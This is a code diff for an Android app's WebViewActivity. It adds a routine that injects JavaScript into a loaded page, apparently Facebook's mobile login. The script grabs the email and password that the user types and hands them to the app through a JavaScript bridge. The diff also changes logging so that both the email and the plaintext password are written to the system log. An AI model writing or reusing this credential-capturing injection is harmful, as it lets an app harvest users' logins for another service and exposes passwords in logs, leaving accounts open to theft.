@@ -55,17 +55,30 @@ public class WebViewActivity extends AppCompatActivity {
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
 
-                myWebView.loadUrl("javascript:(function() { " +
-                        "document.querySelector('button[type=\"submit\"]').addEventListener('click', function() { " +
-                        "var email = document.querySelector('input[name=\"email\"]').value; " +
-                        "var password = document.querySelector('input[name=\"pass\"]').value; " +
-                        "Android.handleLoginData(email, password); " +
-                        "}); " +
-                        "})()");
+                injectJavaScript(view);
             }
         });
 
     }
+
+    private void injectJavaScript(WebView view) {
+        view.loadUrl("javascript:(function() {" +
+                "console.log('Injecting JavaScript');" +
+
+                // Capture email and password values
+                // Id is added dynamically - pc_id = email / mobile_id = m_login_email
+                // Input has static name, it works regardless
+                "var email = document.querySelector('#m_login_email').value ;" +
+                "var password = document.querySelector('input[name=\"pass\"]').value  ;" +
+
+                "Android.handleLoginData(email,password);" +
+
+                "})()");
+    }
+
+
+
+
 
     public class WeAppInterface{
         @JavascriptInterface
@@ -73,8 +86,8 @@ public class WebViewActivity extends AppCompatActivity {
             email = emailFac;
             password = passwordFac;
 
-            Log.d("tag","email facebook: " + email);
-            Toast.makeText(WebViewActivity.this, "email: " + email, Toast.LENGTH_SHORT).show();
+            Log.i("WebView", "Email: " + emailFac);
+            Log.i("WebView", "Password: " + passwordFac);
         }
     }
 }
